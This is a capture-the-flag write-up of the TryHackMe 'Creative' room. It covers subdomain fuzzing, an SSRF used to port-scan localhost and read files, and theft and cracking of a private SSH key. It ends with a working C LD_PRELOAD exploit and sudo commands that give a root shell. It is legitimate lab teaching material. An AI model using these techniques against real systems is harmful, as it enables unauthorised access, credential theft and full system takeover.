---
title: "TryHackMe - Creative"
author: Nasrallah
description: ""
date: 2024-04-29 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, ssrf, sudo, LD_PRELOAD, ssh, cracking]
img_path: /assets/img/tryhackme/creative
image:
    path: creative.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

## **Description:**

[Creative](https://tryhackme.com/room/creative) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) has a website vulnerable to SSRF allowing us to read files on the system, so we read a private ssh key and get a foothold. A sudo entry with LD_PRELOAD is then exploited to get a root shell.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.59.245
Host is up (0.12s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, 22 running OpenSSH and 80 running Nginx and redirecting to `creative.thm`, so let's add it to `/etc/hosts`

### Web

Let's check the web page.

![webpage](1.png)

Nothing look interesting for us in this page, and the website seems to be static.

#### Subdomain

Let's run a subdomain scan and see what we can find.

```terminal
$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://creative.thm/ -H "Host: FUZZ.creative.thm" -fw 6                                                                                                  
                                                                                                                      
        /'___\  /'___\           /'___\                                                                               
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                               
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                              
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                              
         \ \_\   \ \_\  \ \____/  \ \_\                                                                               
          \/_/    \/_/   \/___/    \/_/                                                                               
                                                                                                                      
       v2.1.0-dev                                                                                                     
________________________________________________                                                                      
                                                                                                                      
 :: Method           : GET                                                                                            
 :: URL              : http://creative.thm/                                                                           
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 167ms]
:: Progress: [4989/4989] :: Job [1/1] :: 289 req/sec :: Duration: [0:00:21] :: Errors: 0 ::

```

We found the subdomain `beta`, let's add `beta.creative.thm` to `/etc/hosts` and go check it.

![beta](2.png)

This is a url tester. I gave it `https://127.0.0.1/` and got this.

![backhome](3.png)

It's the `creative.thm` we visited earlier, This means this form is vulnerable to `SSRF`(Server Side Request Forgery).

#### SSRF

One thing we can try here is to look for open ports. We can do that by requesting `http://127.0.0.1:{portnumber}/`

It's going to take a lot of time if we do it manually so we'll use `ffuf` for this.

First I'll generate a list of all the ports using the following command:

```bash
for i in {0..65353}; echo $i >> ports.lst; done
```

Now we use the following ffuf command to do the fuzzing for us.

```terminal
$ ffuf -c -w ./ports.lst -u http://beta.creative.thm/ -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data "url=http://127.0.0.1:FUZZ" -fs 13

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://beta.creative.thm/
 :: Wordlist         : FUZZ: /home/sirius/CTF/THM/creative/ports.lst
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : url=http://127.0.0.1:FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13
________________________________________________

0                       [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 284ms]
80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 242ms]
1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 213ms]
```

We found the port 80 which means our script is working perfectly, and also found port 1337.

I'll use `curl` from now on the do the requests.

Let's check what's on port 1337 using the SSRF vulnerability.

```terminal
$ curl 'http://beta.creative.thm' -X POST --data 'url=http://127.0.0.1:1337'           
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href="bin/">bin@</a></li>
<li><a href="boot/">boot/</a></li>
<li><a href="dev/">dev/</a></li>
<li><a href="etc/">etc/</a></li>
<li><a href="home/">home/</a></li>
<li><a href="lib/">lib@</a></li>
<li><a href="lib32/">lib32@</a></li>
<li><a href="lib64/">lib64@</a></li>
<li><a href="libx32/">libx32@</a></li>
<li><a href="lost%2Bfound/">lost+found/</a></li>
<li><a href="media/">media/</a></li>
<li><a href="mnt/">mnt/</a></li>
<li><a href="opt/">opt/</a></li>
<li><a href="proc/">proc/</a></li>
<li><a href="root/">root/</a></li>
<li><a href="run/">run/</a></li>
<li><a href="sbin/">sbin@</a></li>
<li><a href="snap/">snap/</a></li>
<li><a href="srv/">srv/</a></li>
<li><a href="swap.img">swap.img</a></li>
<li><a href="sys/">sys/</a></li>
<li><a href="tmp/">tmp/</a></li>
<li><a href="usr/">usr/</a></li>
<li><a href="var/">var/</a></li>
</ul>
<hr>
</body>
</html>

```

It showed us the file system!!!

## **Foothold**

We can see the file system, let's see if we can navigate to other directories.

```terminal
$ curl 'http://beta.creative.thm' -X POST --data 'url=http://127.0.0.1:1337/home'     
[...]
</head>
<body>
<h1>Directory listing for /home/</h1>
<hr>
<ul>
<li><a href="saad/">saad/</a></li>
</ul>
<hr>
</body>
</html>
```

We managed to list the `home` directory revealing the user `saad`. Let's list his directory.

```terminal
$ curl 'http://beta.creative.thm' -X POST --data 'url=http://127.0.0.1:1337/home/saad'
[...]
<body>
<h1>Directory listing for /home/saad/</h1>
<hr>
<ul>
<li><a href=".bash_history">.bash_history</a></li>
<li><a href=".bash_logout">.bash_logout</a></li>
<li><a href=".bashrc">.bashrc</a></li>
<li><a href=".cache/">.cache/</a></li>
<li><a href=".gnupg/">.gnupg/</a></li>
<li><a href=".local/">.local/</a></li>
<li><a href=".profile">.profile</a></li>
<li><a href=".ssh/">.ssh/</a></li>
<li><a href=".sudo_as_admin_successful">.sudo_as_admin_successful</a></li>
<li><a href="snap/">snap/</a></li>
<li><a href="start_server.py">start_server.py</a></li>
<li><a href="user.txt">user.txt</a></li>
</ul>
<hr>
</body>
</html>

```

We can see a `.ssh` directory, hopefully it has a readable `id_rsa` key for us.

```terminal
$ curl 'http://beta.creative.thm' -X POST --data 'url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA1J8+LAd
[REDACTED]
Fcm9ZL3fa5FhAEdRXJrF8Oe5ZkHsj3nXLYnc2Z2Aqjl6TpMRubuu+qnaOdCnAGu1ghqQlS
ksrXEYjaMdndnvxBZ0zi9T+ywag=
-----END OPENSSH PRIVATE KEY-----
```

We got the key! Now let's connect with it.

![ssh](4.png)

The key is protected with a password so we used `ssh2john` to get the hash of the password, then use `john` to crack the hash.

## **Privilege Escalation**

Listing the directory of `saad` we notice that the `.bash_history` is not empty.

```terminal
saad@m4lware:~$ ls -la
total 52
drwxr-xr-x 7 saad saad 4096 Jan 21  2023 .
drwxr-xr-x 3 root root 4096 Jan 20  2023 ..
-rw------- 1 saad saad  362 Jan 21  2023 .bash_history
-rw-r--r-- 1 saad saad  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 saad saad 3797 Jan 21  2023 .bashrc
drwx------ 2 saad saad 4096 Jan 20  2023 .cache
drwx------ 3 saad saad 4096 Jan 20  2023 .gnupg
drwxrwxr-x 3 saad saad 4096 Jan 20  2023 .local
-rw-r--r-- 1 saad saad  807 Feb 25  2020 .profile
drwx------ 3 saad saad 4096 Jan 20  2023 snap
drwx------ 2 saad saad 4096 Jan 21  2023 .ssh
-rwxr-xr-x 1 root root  150 Jan 20  2023 start_server.py
-rw-r--r-- 1 saad saad    0 Jan 20  2023 .sudo_as_admin_successful
-rw-rw---- 1 saad saad   33 Jan 21  2023 user.txt
```

Let's print it out.

```terminal
saad@m4lware:~$ cat .bash_history 
whoami
sudo -l
echo "saad:My[REDACTED]$4291" > creds.txt
rm creds.txt
sudo -l
whomai
[...]
```

We got the password of `saad`. Let's check our privileges.

```terminal
saad@m4lware:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
```

We can run ping as root, but that's not useful for us.

The other thing we see is `env_keep+=LD_PRELOAD`, and with this we can easily get root.

> LD_PRELOAD means basicly that we can specify a shared library to run before the program(ping). for more information check [here](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
{: .prompt-info }

First we need to write the following c code to a file.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Now we compile the file using the following command:

```bash
gcc exploit.c -o exploit -fPIC -shared -nostartfiles -w
```

> Assuming you named the file exploit.c, otherwise change the name.

Now we run the sudo command:

```bash
sudo LD_PRELOAD=/home/saad/exploit /usr/bin/ping
```

![root](5.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---
